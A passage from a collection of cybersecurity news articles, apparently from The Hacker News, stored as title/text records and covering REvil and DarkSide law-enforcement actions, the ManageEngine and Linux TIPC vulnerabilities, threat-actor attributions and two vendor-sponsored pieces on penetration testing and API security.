records.“\n“We take the security of all collected data extremely seriously, and we don’t intend to use this data for anything beyond the fulfillment of our regulatory requirements,“ the company points out in a support page.

{'title': 'U.S. Charges Ukrainian Hacker for Kaseya Attack; Seizes $6 Million from REvil Gang',
'text': 'The U.S. government on Monday charged a Ukrainian suspect, arrested in Poland last month, with deploying REvil ransomware to target multiple businesses and government entities in the country, including perpetrating the attack against software company Kaseya, marking the latest action to crack down on the cybercrime group and curb further attacks.\nAccording to unsealed court documents, 22-year-old Yaroslav Vasinskyi is alleged to have been part of the ransomware operation at least since March 2019 and deployed about 2,500 attacks against businesses worldwide. Vasinskyi (aka Profcomserv, Rabotnik, Rabotnik_New, Yarik45, Yaraslav2468, and Affiliate 22) was apprehended at the Polish border on October 8 after an international arrest warrant was issued at the behest of U.S. authorities.\nIn another major development, the Justice Department disclosed the seizure of $6.1 million in alleged ransomware payments received by Russian national Yevgeniy Polyanin, who is currently at large and has been accused of conducting REvil ransomware attacks against multiple businesses and government entities in Texas dating back to August 16, 2019.\n\nVasinskyi and Polyanin have been charged with conspiracy to commit fraud and related activity in connection with computers, substantive counts of damage to protected computers, and conspiracy to commit money laundering. If convicted of all counts, both the defendants face a maximum penalty of 115 and 145 years in prison, respectively.\n“Ransomware can cripple a business in a matter of minutes. These two defendants deployed some of the internet’s most virulent code, authored by REvil, to hijack victim computers,“ said Acting U.S. Attorney Chad E. Meacham for the Northern District of Texas in a statement. “The Department will delve into the darkest corners of the internet and the furthest reaches of the globe to track down cyber criminals.“\n\nThe latest development comes amid a flurry of law enforcement activity orchestrated by Europol under Operation GoldDust, which resulted in the arrests of six other REvil ransomware affiliates besides Vasinskyi across Romania, Kuwait, and South Korea. The REvil ransomware gang is believed to have netted more than $200 million since it started operations and globally encrypted at least 175,000 computers.\nCoinciding with the arrests, the U.S. government also announced it’s offering a reward of up to $10 million for information leading to the identification or location of key leaders behind the REvil ransomware, in addition to paying out up to $5 million for information leading to the arrest or conviction of individuals, located in any country, participating in REvil ransomware attacks.\n\nFurthermore, the U.S. Treasury Department imposed sanctions against Chatex, a virtual currency exchange, for “facilitating financial transactions for ransomware actors,“ following a similar designation against Russian cryptocurrency exchange SUEX in September 2021.\n\n“Analysis of Chatex’s known transactions indicate that over half are directly traced to illicit or high-risk activities such as darknet markets, high-risk exchanges, and ransomware,“ the department said. “Chatex has direct ties with SUEX OTC, S.R.O. (Suex), using Suex’s function as a nested exchange to conduct transactions.“\nThe arrests and the sanctions are part of a larger push to fight against ransomware attacks, which have accelerated in frequency and scale this year, putting critical infrastructure at risk and causing millions in damages, prompting international authorities to effectively respond to such intrusions, while also countering the abuse of cryptocurrency channels to launder ransom payments.\n\n\nFound this article interesting?

{'title': 'Suspected REvil Ransomware Affiliates Arrested in Global Takedown',
'text': 'Romanian law enforcement authorities have announced the arrest of two individuals for their roles as affiliates of the REvil ransomware family, dealing a severe blow to one of the most prolific cybercrime gangs in history.\nThe suspects are believed to have orchestrated more than 5,000 ransomware attacks and extorted close to $600,000 from victims, according to Europol. The arrests, which happened on November 4, are part of a coordinated operation called GoldDust, which has resulted in the arrest of three other REvil affiliates and two suspects connected to GandCrab in Kuwait and South Korea since February 2021.\n\nThis also includes a 22-year-old Ukrainian national, Yaroslav Vasinskyi, who was arrested in early October and has been accused of perpetrating the devastating attack on Florida-based software firm Kaseya in July 2021, affecting up to 1,500 downstream businesses. In all, the seven suspects linked to the two ransomware families are said to have targeted about 7,000 victims, while collectively demanding more than €200 million in digital ransoms.\nShort for Ransomware Evil, REvil (aka Sodinokibi) is seen as the successor of GandCrab and has been linked to a number of high-profile ransomware attacks subsequent to its emergence in the threat landscape in 2019. Operating as a ransomware-as-a-service (RaaS), the cybercrime syndicate is known to rent their malware source code to affiliates, typically after vetting their technical skills, who, in turn, are responsible for carrying out the attacks against appropriate victims.\nThat said, REvil has had a turbulent few months in the wake of Kaseya ransomware attacks, not least in part fuelled by a series of steps taken by governments around the world to tackle the ransomware ecosystem, calling it an “escalating global security threat with serious economic and security consequences.“ On July 14, the dark web data leak portals owned by the group went off the grid, only to make a reappearance in September after a two-month break.\n\nBut the criminal group shut down its operations again last month after the U.S. Cyber Command, in partnership with a foreign government, compromised its Tor infrastructure, forcing its websites to be taken offline, according to a Washington Post report. Romanian cybersecurity firm Bitdefender has since made available a free universal decryptor that REvil victims can use to restore their files and recover from attacks carried out prior to July 13, 2021.\nThe sweeping international law enforcement effort aimed identifying, wiretapping, and seizing the infrastructure used by the REvil ransomware cartel was undertaken by Australia, Belgium, Canada, France, Germany, the Netherlands, Luxembourg, Norway, Philippines, Poland, Romania, South Korea, Sweden, Switzerland, Kuwait, the U.K., and the U.S., along with support from Europol, Eurojust, and Interpol.\n\n\nFound this article interesting?

'text': 'At least nine entities across the technology, defense, healthcare, energy, and education industries were compromised by leveraging a recently patched critical vulnerability in Zoho’s ManageEngine ADSelfService Plus self-service password management and single sign-on (SSO) solution.\nThe spying campaign, which was observed starting September 22, 2021, involved the threat actor taking advantage of the flaw to gain initial access to targeted organizations, before moving laterally through the network to carry out post-exploitation activities by deploying malicious tools designed to harvest credentials and exfiltrate sensitive information via a backdoor.\n“The actor heavily relies on the Godzilla web shell, uploading several variations of the open-source web shell to the compromised server over the course of the operation,“ researchers from Palo Alto Networks’ Unit 42 threat intelligence team said in a report. “Several other tools have novel characteristics or have not been publicly discussed as being used in previous attacks, specifically the NGLite backdoor and the KdcSponge stealer.“\n\nTracked as CVE-2021-40539, the vulnerability relates to an authentication bypass vulnerability affecting REST API URLs that could enable remote code execution, prompting the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to warn of active exploitation attempts in the wild. The security shortcoming has been rated 9.8 out of 10 in severity.\nReal-world attacks weaponizing the bug are said to have commenced as early as August 2021, according to CISA, the U.S. Federal Bureau of Investigation (FBI), and the Coast Guard Cyber Command (CGCYBER).\nUnit 42’s investigation into the attack campaign found that successful initial exploitation activities were consistently followed by the installation of a Chinese-language JSP web shell named “Godzilla,“ with select victims also infected with a custom Golang-based open-source Trojan called “NGLite.“\n“NGLite is characterized by its author as an ’anonymous cross-platform remote control program based on blockchain technology,’“ researchers Robert Falcone, Jeff White, and Peter Renals explained. “It leverages New Kind of Network (NKN) infrastructure for its command and control (C2) communications, which theoretically results in anonymity for its users.“\n\nIn subsequent steps, the toolset enabled the attacker to run commands and move laterally to other systems on the network, while simultaneously transmitting files of interest. Also deployed in the kill chain is a novel password-stealer dubbed “KdcSponge“ orchestrated to steal credentials from domain controllers.\nUltimately, the adversary is believed to have targeted at least 370 Zoho ManageEngine servers in the U.S. alone beginning September 17. While the identity of the threat actor remains unclear, Unit 42 said it observed correlations in tactics and tooling between the attacker and that of Emissary Panda (aka APT27, TG-3390, BRONZE UNION, Iron Tiger, or LuckyMouse).\nMicrosoft, which is also independently tracking the same campaign, tied it to an emerging threat cluster “DEV-0322“ that’s operating out of China and has been previously detected exploiting a zero-day flaw in SolarWinds Serv-U managed file transfer service in July 2021. The Redmond-based company also pointed out the deployment of an implant called “Zebracon“ that allows the malware to connect to compromised Zimbra email servers with the goal of retrieving additional instructions.\n“Organizations that identify any activity related to ManageEngine ADSelfService Plus indicators of compromise within their networks should take action immediately,“ CISA said, in addition to recommending “domain-wide password resets and double Kerberos Ticket Granting Ticket (TGT) password resets if any indication is found that the ’NTDS.dit’ file was compromised.“\n\n\nFound this article interesting?

{'title': 'BlackBerry Uncovers Initial Access Broker Linked to 3 Distinct Hacker Groups',
'text': 'A previously undocumented initial access broker has been unmasked as providing entry points to three different threat actors for mounting intrusions that range from financially motivated ransomware attacks to phishing campaigns.\nBlackBerry’s research and intelligence team dubbed the entity “Zebra2104,“ with the group responsible for offering a means of a digital approach to ransomware syndicates such as MountLocker and Phobos, as well as the advanced persistent threat (APT) tracked under the moniker StrongPity (aka Promethium).\nThe threat landscape as we know it has been increasingly dominated by a category of players known as the initial access brokers (IABs), who are known to provide other cyber-criminal groups, including ransomware affiliates, with a foothold to an infinite pool of potential organizations belonging to diverse geographies and sectors via persistent backdoors into the victim networks, effectively building a pricing model for remote access.\n\n“IABs typically first gain entry into a victim’s network, then sell that access to the highest bidder on underground forums located in the dark web,“ BlackBerry researchers noted in a technical report published last week. “Later, the winning bidder will often deploy ransomware and/or other financially motivated malware within the victim’s organization, depending on the objectives of their campaign.“\nAn August 2021 analysis of more than 1,000 access listings advertised for sale by IABs in underground forums on the dark web found that the average cost of network access was $5,400 for the period July 2020 to June 2021, with the most valuable offers including domain admin privileges to enterprise systems. \n\nThe Canadian cybersecurity company’s investigation began with a domain named “trashborting[.]com“ that was found delivering Cobalt Strike Beacons, using it to link the broader infrastructure to a number of malspam campaigns that resulted in the delivery of ransomware payloads, some of which targeted Australian real estate companies and state government departments in September 2020.\n\nOn top of that, “supercombinating[.]com,“ another sister domain registered alongside trashborting[.]com, was discovered connected to malicious MountLocker and Phobos activity, even as the domain resolved to an IP address “91.92.109[.]174,“ which, in turn, was also used to host a third domain “mentiononecommon[.]com“ between April and November 2020 and put to use as a command-and-control server in a June 2020 campaign associated with StrongPity.\n\nThe IAB’s overlaps and wide targeting has also led the researchers to believe that the operator “either has a lot of manpower or they’ve set up some large ’hidden in plain sight’ traps across the internet,“ enabling MountLocker, Phobos and StrongPity to source their access to targeted networks.\n“The interlinking web of malicious infrastructure seen throughout this research has shown that, in a manner that mirrors the legitimate business world, cybercrime groups are in some cases run not unlike multinational organizations,“ the researchers said. “They create partnerships and alliances to help advance their goals. If anything, it is safe to assume that these threat group ’business partnerships’ are going to become even more prevalent in future.“\n\n\nFound this article interesting?

{'title': 'Types of Penetration Testing',
'text': 'If you are thinking about performing a penetration test on your organization, you might be interested in learning about the different types of tests available. With that knowledge, you’ll be better equipped to define the scope for your project, hire the right expert and, ultimately, achieve your security objectives.\nWhat is penetration testing?\nPenetration testing, commonly referred to as “pen testing,“ is a technique that simulates real-life attacks on your IT systems to find weaknesses that could be exploited by hackers. Whether to comply with security regulations such as ISO 27001, gain customer and 3rd party trust, or achieve your own peace of mind, penetration testing is an effective method used by modern organizations to strengthen their cyber security posture and prevent data breaches. \nRead about the different types of penetration testing to find out which type you can benefit from the most:\nNetwork penetration testing\nAs the name suggests, a network penetration test aims to identify weaknesses in your network infrastructure, be that on the premises or in cloud environments. It is one of the most common and crucial tests to perform to ensure the security of your business-critical data. \nNetwork penetration testing covers a broad range of checks, including insecure configurations, encryption vulnerabilities, and missing security patches in order to determine the steps a hacker could take to attack your organization. Security professionals often categorize this test into two different perspectives: external and internal.\nExternal penetration testing involves searching for vulnerabilities that could be exploited by any attacker with access to the internet. In this scenario, penetration testers are trying to get access to your business-critical systems and data in order to determine how an attacker without any prior access or knowledge would be able to target your organization. You can think of this test as being performed from the perspective of an “outsider“.\nIn contrast, internal penetration testing is concerned with testing your internal corporate environment. This type of testing considers scenarios in which an attacker has managed to gain an initial foothold within your corporate network, for example by exploiting a vulnerability in one of your internet-facing systems, or through the use of social engineering. In this case, the test is performed from an “insider“ perspective, with an objective of finding a way to steal sensitive information or disrupting the operations of an organization.\nGenerally speaking, external weaknesses are considered to pose a more serious threat than internal. For one thing, a hacker has to overcome an external security barrier before accessing your internal networks and pivoting to other systems. If you haven’t conducted any kind of penetration testing before, an external or “perimeter“ test is often the best place to start, as the perimeter is the easiest thing for attackers to get to. If you have trivial vulnerabilities in your internet-facing infrastructure, that’s where the hackers will start.\nWeb application penetration testing\nWeb application penetration testing attempts to uncover vulnerabilities across websites and web applications, such as e-commerce platforms, content management systems, and customer relationship management software. This type of test deals with reviewing the entire web application’s security, including its underlying logic and custom functionalities, to prevent data breaches. \nSome of the common vulnerabilities detected during a web app penetration test include database injections, cross-site scripting (XSS), and broken authentication. If you are interested in learning more about different types of web application weaknesses, their severity and how you can prevent them, the Open Web Application Security Project (OWASP) Top 10 is a great place to start. Every few years OWASP publishes information about the most frequent and dangerous web application flaws, basing its findings on the data collected from many thousands of applications.\nConsidering the prevalence of web applications in modern organizations, and the valuable information that they transmit and store, it is unsurprising that they are an attractive target to cybercriminals. According to Verizon’s “2021 Data Breach Investigations Report“, the proportion of incidents, which involved web application assets, reached nearly 50%. For this reason, organizations that are developing or managing their own internet-facing applications should strongly consider conducting web application penetration testing.\nAutomated penetration testing\nUnderstandably, as penetration tests can be costly and infrequent (only run once or twice per year), many people naturally wonder if automated penetration testing is feasible. \nWhile it’s not possible to fully automate a penetration test (as there will always be an element of manual work conducted by skilled professionals), it’s similarly impossible for humans to manually check for every vulnerability that exists, there are simply too many. That’s where vulnerability scanning comes in, with these tools you can: schedule scans; get rapidly tested for many thousands of weaknesses; and be notified of your results in a variety of channels and formats. It’s no wonder that vulnerability scanners form a critical part of a penetration testers toolkit. \nOne such tool that you can explore is Intruder. It offers automated security scanning that is designed to be simple and fast, so you can get set-up and protected in little to no time. Intruder includes Emerging Threat Scans, which proactively check your systems for newly discovered vulnerabilities as soon as they are disclosed. \nIt may not be a fully automated penetration test, but it certainly is like having an automated penetration tester watching over your systems. When you combine continuous vulnerability scanning with an annual penetration test, you can rest assured that your systems are covered by a robust and comprehensive cyber security program.\nIntruder automatically separates purely informational results from actionable issues, significantly saving technical teams time on analyzing their scan results.\nIf you’d like to see the automated tool in action, you can take Intruder’s Pro Plan for a spin with the 30-day free trial.\nSocial engineering \nIn comparison to previously described penetration testing types, which focus on finding weaknesses in technology, social engineering attempts to compromise the security of an organization by exploiting human psychology. It can take a variety of forms and could be executed both remotely, for example by trying to obtain sensitive information from users through phishing emails or phone calls, or on-site, in which case a penetration tester will attempt to gain access to a physical facility. In all cases, an objective of this penetration test is to manipulate individuals, usually the company’s employees, to give away valuable information.\nThe success of a social engineering penetration test largely depends on the information gathered in the “reconnaissance“ phase, which involves researching targeted individuals or an organization by using publicly accessible open-source intelligence (OSINT). After building a more precise image of their target, a penetration tester can use discovered information to proceed with the creation of a tailored attack strategy. \nOne of the most common attack vectors in social engineering is a phishing attack, usually delivered by email. When performing a phishing attack, a penetration tester does not necessarily stop when an unsuspecting employee clicks on a malicious link, but can go further, attempting to steal user credentials and get access to an employee’s laptop. Such attacks can be extremely successful, especially when performed by experienced penetration testers.\nSocial engineering penetration testing is not as widely adopted as network or web application testing. However, if your organization is already doing regular security awareness training, conducting a dedicated social engineering test can be a great addition to your arsenal for identifying and fixing security issues in your operations.\nRed teaming \nThis advanced technique has its origin in military training exercises. It is designed to challenge an organization’s security, processes, policies and plans by adopting an adversarial mindset. In contrast, Blue teaming, otherwise known as “defensive security,“ involves detecting and withstanding Red team attacks as well as real-life adversaries.\nRed Teaming combines digital, social and physical domains to implement comprehensive real-life attack scenarios. As such, Red Teaming can be considered a distinct operation from penetration testing, but since its tasks span all of the penetration testing types described above, we thought it was worth mentioning it in this article.\nAn objective of a standard penetration test is to find as many vulnerabilities as possible within a given timeframe. The breath of this test is naturally limited by the scope of work; but real-life adversaries don’t have such artificial restrictions to follow. As a result, even if an organization regularly performs penetration tests and vulnerability scans, it can still be exposed to more sophisticated attacks such as where social engineering and internal network weaknesses are chained together. This is where Red Teaming comes in. It assesses an organization’s environment as a whole, understanding how all parts function together. It then applies critical thinking to discover new vulnerabilities that attackers can exploit, helping the organization to assess its response to real-world attacks.\nCompared to the standard penetration test, which lasts several days or weeks, Red Team assessments generally take much longer, in some cases several months to complete. Due to its complex nature, it is a rather rare operation, typically performed by larger organizations or by government contractors with well-established security programmes. \nTo conclude\nPenetration testing is a broad discipline that encompasses different techniques, so it is important to understand the relative risks that your organization is facing in order to choose the most appropriate type. If you are still unsure what type of testing is appropriate for your organization, you can reach out to Intruder’s team of experienced penetration testers, who will be able to help you. \nAbout Intruder \nIntruder is an international cyber security company that helps organizations reduce their cyber exposure by providing an effortless vulnerability scanning solution.

{'title': 'Ukraine Identifies Russian FSB Officers Hacking As Gamaredon Group',
'text': 'Ukraine’s premier law enforcement and counterintelligence agency on Thursday disclosed the real identities of five individuals allegedly involved in digital intrusions attributed to a cyber-espionage group named Gamaredon, linking the members to Russia’s Federal Security Service (FSB).\nCalling the hacker group “an FSB special project, which specifically targeted Ukraine,“ the Security Service of Ukraine (SSU) said the perpetrators “are officers of the ’Crimean’ FSB and traitors who defected to the enemy during the occupation of the peninsula in 2014.“\n\nThe names of the five individuals the SSU alleges are part of the covert operation are Sklianko Oleksandr Mykolaiovych, Chernykh Mykola Serhiiovych, Starchenko Anton Oleksandrovych, Miroshnychenko Oleksandr Valeriiovych, and Sushchenko Oleh Oleksandrovych.\nSince its inception in 2013, the Russia-linked Gamaredon group (aka Primitive Bear, Armageddon, Winterflounder, or Iron Tilden) has been responsible for a number of malicious phishing campaigns, primarily aimed at Ukrainian institutions, with the goal of harvesting classified information from compromised Windows systems for geopolitical gains.\n\nThe threat actor is believed to have carried out no fewer than 5,000 cyberattacks against public authorities and critical infrastructure located in the country, and attempted to infect over 1,500 government computer systems, with most attacks directed at security, defense, and law enforcement agencies to obtain intelligence information.\n“Contrary to other APT groups, the Gamaredon group seems to make no effort in trying to stay under the radar,“ Slovak cybersecurity firm ESET noted in an analysis published in June 2020. “Even though their tools have the capacity to download and execute arbitrary binaries that could be far stealthier, it seems that this group’s main focus is to spread as far and fast as possible in their target’s network while trying to exfiltrate data.“\n\nBesides its heavy reliance on social engineering tactics as an intrusion vector, Gamaredon is known to have invested in a range of tools for scything through organizations’ defenses that are coded in a variety of programming languages such as VBScript, VBA Script, C#, C++, as well as using CMD, PowerShell, and .NET command shells.\n“The group’s activities are characterized by intrusiveness and audacity,“ the agency pointed out in a technical report.\n\nChief among its malware arsenal is a modular remote administration tool named Pterodo (aka Pteranodon) that comes with remote access capabilities, keystroke logging, the ability to take screenshots, access microphone, and also download additional modules from a remote server. Also put to use is a .NET-based file stealer that’s designed to collect files with the following extensions: *.doc, *.docx, *.xls, *.rtf, *.odt, *.txt, *.jpg, and *.pdf.\nA third tool concerns a malicious payload that’s engineered to distribute the malware through connected removable media, in addition to collecting and siphoning data stored in those devices. \n“The SSU is continuously taking steps to contain and neutralize Russia’s cyber aggression against Ukraine,“ the agency said. “Established as a unit of the so-called ’FSB Office of Russia in the Republic of Crimea and the city of Sevastopol,’ this group of individuals acted as an outpost […] from 2014 purposefully threatening the proper functioning of state bodies and critical infrastructure of Ukraine.“\n\n\nFound this article interesting?

'text': 'The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has published a catalog of vulnerabilities, including from Apple, Cisco, Microsoft, and Google, that have known exploits and are being actively exploited by malicious cyber actors, in addition to requiring federal agencies to prioritize applying patches for those security flaws within “aggressive“ timeframes.\n\n“These vulnerabilities pose significant risk to agencies and the federal enterprise,“ the agency said in a binding operational directive (BOD) issued Wednesday. “It is essential to aggressively remediate known exploited vulnerabilities to protect federal information systems and reduce cyber incidents.“\nAbout 176 vulnerabilities identified between 2017 and 2020, and 100 flaws from 2021 have made their way to the initial list, which is expected to be updated with additional actively exploited vulnerabilities as and when they become known provided they have been assigned Common Vulnerabilities and Exposures (CVE) identifiers and have clear remediation action.\n\nThe binding directive mandates that security vulnerabilities discovered in 2021 — those tracked as CVE-2021-XXXXX — be addressed by November 17, 2021, while setting a patching deadline of May 3, 2022 for the remaining older vulnerabilities. Although the BOD is primarily aimed at federal civilian agencies, CISA is recommending private businesses and state entities to review the catalog and remediate the vulnerabilities to strengthen their security and resilience posture.\n\nThe new strategy also sees the agency moving away from severity-based vulnerability remediation to those that pose significant risk and are being abused in real-world intrusions in light of the fact that adversaries do not always necessarily bank only on ’critical’ weaknesses to achieve their goals, with some of the most widespread and devastating attacks chaining multiple vulnerabilities rated ’high,’ ’medium,’ or even ’low.’\n“This directive does two things. First, it establishes an agreed upon list of vulnerabilities that are being actively exploited,“ Tim Erlin, Tripwire’s VP of Strategy, said. “Second, it provides due dates for remediating those vulnerabilities. By providing a common list of vulnerabilities to target for remediation, CISA is effectively leveling the playing field for agencies in terms of prioritization. It’s no longer up to each individual agency to decide which vulnerabilities are the highest priority to patch.“\n\n\nFound this article interesting?

'text': 'The U.S. government on Thursday announced a $10 million reward for information that may lead to the identification or location of key individuals who hold leadership positions in the DarkSide ransomware group or any of its rebrands.\nOn top of that, the State Department is offering bounties of up to $5 million for intel and tip-offs that could result in the arrest and/or conviction in any country of individuals who are conspiring or attempting to participate in intrusions affiliated with the transnational organized crime syndicate.\n\n“In offering this reward, the United States demonstrates its commitment to protecting ransomware victims around the world from exploitation by cyber criminals,“ the State Department said in a statement. “The United States looks to nations who harbor ransomware criminals that are willing to bring justice for those victim businesses and organizations affected by ransomware.“\n\nThe development comes in response to DarkSide’s high-profile attack on Colonial Pipeline in May 2021, taking down the largest fuel pipeline in the U.S. and disrupting fuel supply to the East Coast for roughly a week, after the hackers managed to gain entry into the company’s networks using a compromised virtual private network (VPN) account password that was circulating in the dark web.\n\nThe ensuing heightened scrutiny in the wake of the attacks led to the DarkSide group shuttering its operations on May 17, citing a mysterious law enforcement seizure of its online attack infrastructure. The cartel has since attempted to resurrect itself in the form of BlackMatter, only for it to close shop a second time owing to pressure from local authorities and the disappearance of a part of its members last month.\nWhile it’s common for ransomware gangs to go underground, regroup, and reincarnate, often under a new name, law enforcement agencies in the U.S., Europe, and Asia have sought to crack down on the criminal actors and blunt the impact of their operations in various ways, forcing the cybercriminals to cease operations over fears of being outed and arrested.\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers have disclosed a security flaw in the Linux Kernel’s Transparent Inter Process Communication (TIPC) module that could potentially be leveraged both locally as well as remotely to execute arbitrary code within the kernel and take control of vulnerable machines.\nTracked as CVE-2021-43267 (CVSS score: 9.8), the heap overflow vulnerability “can be exploited locally or remotely within a network to gain kernel privileges, and would allow an attacker to compromise the entire system,“ cybersecurity firm SentinelOne said in a report published today and shared with The Hacker News.\n\nTIPC is a transport layer protocol designed for nodes running in dynamic cluster environments to reliably communicate with each other in a manner that’s more efficient and fault-tolerant than other protocols such as TCP. The vulnerability identified by SentinelOne has to do with insufficient validation of user-supplied sizes for a new message type called “MSG_CRYPTO“ that was introduced in September 2020 and enables peer nodes in the cluster to send cryptographic keys.\nWhile the protocol has checks in place to validate such messages after decryption to ensure that a packet’s actual payload size doesn’t exceed that of the maximum user message size and that the latter is greater than the message header size, no restrictions were found to be placed on the length of the key (aka ’keylen’) itself, resulting in a scenario where “an attacker can create a packet with a small body size to allocate heap memory, and then use an arbitrary size in the ’keylen’ attribute to write outside the bounds of this location.“\n\nThere is no evidence that the flaw has been abused in real-world attacks to date, and following responsible disclosure on October 19, the issue has been addressed in Linux Kernel version 5.15 released on October 31, 2021.\n\n“The function tipc_crypto_key_rcv is used to parse MSG_CRYPTO messages to receive keys from other nodes in the cluster in order to decrypt any further messages from them,“ Linux kernel maintainers said in a fix pushed late last month. “This patch verifies that any supplied sizes in the message body are valid for the received message.“\n“While TIPC itself isn’t loaded automatically by the system but by end users, the ability to configure it from an unprivileged local perspective and the possibility of remote exploitation makes this a dangerous vulnerability for those that use it in their networks,“ SentinelOne researcher Max Van Amerongen said.\n\n\nFound this article interesting?

{'title': 'Our journey to API security at Raiffeisen Bank International',
'text': 'This article was written by Peter Gerdenitsch, Group CISO at Raiffeisen Bank International, and is based on a presentation given during Imvision’s Executive Education Program, a series of events focused on how enterprises are taking charge of the API security lifecycle.\nLaunching the “Security in Agile“ program\nHeadquartered in Vienna, Raiffeisen Bank International (RBI) operates across 14 countries in Central and Eastern Europe with around 45,000 employees. Our focus is on providing universal banking solutions to customers, as well as developing digital banking products for the retail and corporate markets. Accordingly, RBI has a substantial R&D division, making for a very large community of IT and engineering professionals all over Europe.\nBack in 2019, we began shifting to a product-led agile setup for RBI, introducing various security roles contributing and collaborating to achieve our strategic goals. As part of this journey, we established the security champion role within the DevSecOps team for each of our products. Besides our central “Security Design and Architecture “function, security specialists began working together to support products in implementing secure solutions.\nMore than anything, taking ownership over the security aspect of their product meant security champions were well-positioned to ensure that security-related stories get prioritized during backlog meetings, in alignment with the product owner’s acceptable levels of risk. \n\nWe also set up tribes consisting of several products associated with a specific business-line to foster a shared sense of community. Each tribe was given another role: the “security chapter lead“. \nThis role was tasked with supporting the other security champions in their tribe with requirements, risk assessment, design patterns and architecture, thanks to their enhanced expertise. These roles were transparent so that the knowledge carrier of security for each product and tribe was known across the entire organization. \nFinally, we set up a community of practice, which includes monthly meetings where security champions from all of the different products could meet to exchange information, teach case studies, and generally share knowledge about their practice. We further began supporting this community endeavor with Monday bulletins, updates from the week, and in general encouraged an open exchange of information, knowledge, and experience. \nLearn more on how to take charge of the API security lifecycle\nSecurity ’Martial Arts’ training program\nThe idea was – and still is - to make the security champion a completely volunteer-driven role, which at first had us worried that we wouldn’t be able to find enough willing volunteers. Fortunately, the opposite was true, and we were even able to recruit two people for each position to cover vacations and sick leave. Part of the success probably comes from the fact that we didn’t limit the role in terms of background, which meant we saw plenty of volunteers from various IT and business functions as well. \nTo further support this role, in early 2020 we set up a training program for our security champions based on the martial-arts’ belt system. It started with a 3-day basic training program in security that we called Yellow Belt training. It took off and we quickly gained insights into the program, which resulted in the launch of a slimmer 2-day version of the Yellow Belt that targeted anyone interested in learning more about security. \n\nThis shorter, generalized program for everyone was intended to foster collaboration and awareness across the organization by highlighting the importance of security in the product lifecycle and the rationale behind the security champion program. The security champion program’s extra day was focused on learning more about the RBI specific tools of the trade, especially the use of source code scanning and identity and access management tools. \nOver time we set up additional, more advanced training courses to help security champions do their jobs more effectively. For example, we’ve got an API security course and cloud security course to deepen our security-related knowledge in these domains. We also encourage professional certification via external courses by providing our security champions with the budget and learning time they need to take them. \nTaking charge of our API security lifecycle\nIn accordance with the Payment Service Directive (PSD), over the past several years banks have increasingly been required - and expected - to open their APIs to enable customers to access financial data easily, including through third-party tools and applications. \nThis regulation catalyzed a strong pivot to API use that was already in the making, and RBI’s API posture and consumption dramatically increased. Over the past several years, RBI developed many APIs: today, our API Market has 100+ externally exposed APIs, while internally, we counted ~1,000 different APIs. The rise in API implementation and use brought about security risks, which prompted us to think about ways to address API security. \nAs our API footprint wasn’t limited to just those required by PSD regulations, we quickly discovered that we didn’t necessarily have consistent visibility into all APIs we deployed. Like many other enterprises worldwide, we were challenged with gaining a central view of APIs, considering the high volume and number of APIs in use - so we can ensure that the appropriate and adequate level of security is in place.\nTo address some of these challenges, we decided to set up the Real-Time Integration Center of Excellence (RICE), which serves as a central management layer for RBI, including APIs that connect to the legacy core banking systems of the various subsidiaries and acquired companies.\nAs shown in the diagram below, the central API management layer has all the microservices bound together, serving the business functionality for the APIs and connecting on the outside to the various channels and use cases. This layer is a win-win for us, as it enables us to improve customer experience, performance -- and security.\n\nFrom the security perspective, as per the ’Security in Agile’ approach, each one of the product teams included a security champion. They work with domain experts and the security chapter lead to coordinate security measures in line with the product owner’s designated levels of risk, taking a consultative approach with the relevant business owner defining the priorities.\n\nAPI security: Keys to success\nBuilding API security on strong collaborative foundations means that our business and dev counterparts are able to understand better the value of security, why we need to do this, and the importance of protecting the APIs. \nMost importantly, it became clear that API security was a group endeavor, and that the entire team shared responsibility over that area:\nFrom the business end, since APIs are a crucial part of the organization’s IT infrastructure that must be exposed externally, it’s clear to them that malicious actors would try to penetrate them by posing as API consumers. The program helped us realize that API security is shared between the product owner and IT security teams. \nFrom the product end, being well-prepared, learning from experience and implementing additional layers of protection are key elements in securing APIs. \nFurthermore, there’s a deep shared understanding that security should be taken into consideration throughout development, even from the design stage, and that no product should be launched without thorough penetration testing. \nLearn more on how to get your security testing ready for the API-first era\nManagement buy-in and alignment is perhaps one of the most important factors in the proper implementation of API security in an enterprise. Making sure that they are aware of the importance of API security is key in achieving this buy-in. \nAnother important key success factor is the level of accuracy of the detection technology you choose to work with in your API security journey. The less false positives you get, the better off you are. In essence, for APIs it means you can detect behavior sequences attempting to manipulate the logic and do it in scale. \nFor security to work, it’s clear that this responsibility shouldn’t fall on just one department, but rather be shared by all teams. During our meetings with the RBI Management Board, we also focused on the benefits of the Imvision solution and how it enabled us to focus on top vulnerabilities, while understanding where the functional errors are to prioritize remediation and save resources.\nLike with any partner you choose to work with, the level of cooperation is highly important. In general, the feeling was that the Imvison’s platform doesn’t only provide a powerful security mechanism, but also vast expertise, positive drive and responsiveness to our needs. \n\n\nFound this article interesting?

{'title': 'BlackMatter Ransomware Reportedly Shutting Down; Latest Analysis Released',
'text': 'An analysis of new samples of BlackMatter ransomware for Windows and Linux has revealed the extent to which the operators have continually added new features and encryption capabilities in successive iterations over a three-month period.\nNo fewer than 10 Windows and two Linux versions of the ransomware have been observed in the wild to date, Group-IB threat researcher Andrei Zhdanov said in a report shared with The Hacker News, pointing out the changes in the implementation of the ChaCha20 encryption algorithm used to encrypt the contents of the files.\nBlackMatter emerged in July 2021 boasting of incorporating the “best features of DarkSide, REvil, and LockBit“ and is considered the successor to DarkSide, which has since shut down alongside REvil in the wake of law enforcement scrutiny. Operating as a ransomware-as-a-service (RaaS) model, the BlackMatter is believed to have hit more than 50 companies in the U.S., Austria, Italy, France, Brazil, among others.\n\nWhat’s more, the threat actor creates a unique Tor chat room for communication for each victim, a link to which is attached to the text file containing the ransom demand. BlackMatter is also known to double the ransom amount when the ultimatum expires, before moving to publish the stolen documents in the event the victim refuses to pay up.\nAccording to security researchers from Microsoft’s counter-ransomware unit, DarkSide and its BlackMatter rebrand is the handiwork of a cybercrime group tracked as FIN7, which was recently unmasked operating a front company named Bastion Secure to lure tech professionals with the goal of launching ransomware attacks.\n\n“When other parameters are set or any parameters are absent, the system is fully encrypted according to the configuration settings,“ Zhdanov noted. “Upon completing the encryption, the ransomware creates a BMP image alerting that files have been encrypted, which it then sets as the desktop wallpaper. Starting from version 1.4, the ransomware can also print the text of the demand for ransom on the victim’s default printer.“\n\nThe Linux variants, on the other hand, are designed to target VMware ESXi servers, featuring the ability to terminate virtual machines and 